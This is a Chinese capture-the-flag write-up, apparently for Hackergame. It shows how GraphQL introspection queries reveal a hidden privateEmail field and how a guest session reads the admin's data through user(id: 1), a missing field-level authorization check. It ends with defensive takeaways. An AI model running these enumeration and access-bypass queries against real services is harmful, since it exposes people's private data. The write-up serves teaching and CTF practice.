# 图之上的信息

## 题目简述

网站使用 GraphQL 提供笔记查询。普通 guest 页面没有显示管理员私有邮箱，GraphiQL 调试界面也被关闭，但 `/graphql` 仍开启标准 introspection。漏洞是 GraphQL schema 暴露了 `GUser.privateEmail`，且 `user(id:)` 解析器没有按当前身份做字段级授权。

## 解题过程

先以 guest 登录并从浏览器请求中取得会话 Cookie。关闭 GraphiQL 只移除了可视化界面，并不会关闭 [GraphQL introspection](https://graphql.org/learn/introspection/)。

### 枚举类型和字段

查询 schema 中的类型：

```graphql
{
  __schema {
    types {
      name
    }
  }
}
```

返回中出现自定义类型 `GUser`。继续查询其字段：

```graphql
{
  __type(name: "GUser") {
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

可以看到 `id`、`username` 和未在前端展示的 `privateEmail`。

### 找到根查询参数

再枚举根 `Query` 的字段和参数：

```graphql
{
  __schema {
    queryType {
      fields {
        name
        args {
          name
        }
      }
    }
  }
}
```

结果表明存在 `user(id:)`。guest 的 ID 为 2，管理员通常为 1，于是直接请求：

```graphql
{
  user(id: 1) {
    id
    username
    privateEmail
  }
}
```

服务端在 guest 会话下仍返回管理员私有邮箱，其中包含形如：

```text
flag{dont_let_graphql_l3ak_data_<account-suffix>@hackergame.ustc}
```

的 flag。

## 方法总结

- 核心技巧：用 GraphQL introspection 恢复隐藏的类型、字段、根查询和参数，再验证字段级越权。
- 识别信号：前端只展示 schema 的一部分、GraphiQL 被关闭，但标准 GraphQL 端点仍可接受 `__schema` 和 `__type`。
- 复用要点：关闭调试 UI 不是授权控制；服务端必须在解析器或数据层检查对象与字段权限，生产环境还应按需求限制 introspection 和查询复杂度。
